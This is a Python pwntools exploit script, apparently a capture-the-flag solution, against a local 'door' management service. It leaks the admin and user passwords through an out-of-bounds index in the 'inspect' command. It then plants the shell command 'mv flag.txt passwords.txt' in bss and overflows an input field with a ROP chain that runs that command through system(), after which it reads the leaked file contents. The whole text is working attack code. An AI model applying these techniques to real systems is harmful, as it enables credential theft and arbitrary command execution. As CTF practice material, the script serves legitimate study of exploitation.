
from pwn import *

# context.log_level = "debug"

# gadgets
bss = 0x08121320
handle_custom_command = 0x08049D69

# connect 
# p = process(b"./main")
p = remote("localhost", 4007)
p.recvuntil(b"username> ")
p.sendline(b"Jack")
p.recvuntil(b"password> ")
p.sendline(b"Sparrow")

# leak passwords
p.recvuntil(b"$> ")
p.sendline(b"inspect")
p.recvuntil(b"which one> ")
p.sendline(b"-2")
p.recvuntil(b"name : ")
admin_password_leak = p.recvuntil(b"\n")[:-1]
p.recvuntil(b"zone : ")
user_password_leak = p.recvuntil(b"\n")[:-1]
p.close()
print(f"admin password is {admin_password_leak}")
print(f"user password is {user_password_leak}")

# Add a door to overflow in db processus and rop to change flag.txt to passwords.txt
#   Reconnect as admin
# p = process(b"./main")
p = remote("localhost", 4007)
p.recvuntil(b"username> ")
p.sendline(b"admin")
p.recvuntil(b"password> ")
p.sendline(admin_password_leak)

# sync datas
p.recvuntil(b"$> ")
p.sendline(b"sync")

# modif the first door to write command : "mv flag.txt passwords.txt" in memory that we know addr (bss)
p.recvuntil(b"$> ")
p.sendline(b"modif")
p.recvuntil(b"which one> ")
p.sendline(b"0")
p.recvuntil(b"name> ")
p.sendline(b"aaaa mv flag.txt passwords.txt")
p.recvuntil(b"zone> ")
p.sendline(b"Z")
p.recvuntil(b"is closed ? [y/n] ")
p.sendline(b"n")

#   Send door to overflow and rop to change flag.txt to passwords.txt
p.recvuntil(b"$> ")
p.sendline(b"add")
p.recvuntil(b"name> ")
p.sendline(b"AAAA")
p.recvuntil(b"zone> ")
p.sendline(b"BBBB")
pld  = b"y"*4*7
# ropchain 
pld += b"BBBB"      # last ebp
pld += p32(handle_custom_command) # handle_custom_command()
pld += b"BBBB"      # flood
pld += p32(bss)     # argument of system()

p.recvuntil(b"is closed ? [y/n] ")
p.sendline(pld)
# p.interactive()

# Read new passwords
p.recvuntil(b"$> ")
p.sendline(b"auth")
p.recvuntil(b"username> ")
p.sendline(b"admin")
p.recvuntil(b"password> ")
p.sendline(admin_password_leak)
p.recvuntil(b"$> ")
p.sendline(b"inspect")
p.recvuntil(b"which one> ")
p.sendline(b"-2")
p.recvuntil(b"name : ")
first_line_leak = p.recvuntil(b"\n")[:-1]
p.recvuntil(b"zone : ")
second_line_leak = p.recvuntil(b"\n")[:-1]
p.close()
print(f"first line {first_line_leak}")
print(f"second line {second_line_leak}")

p.interactive()
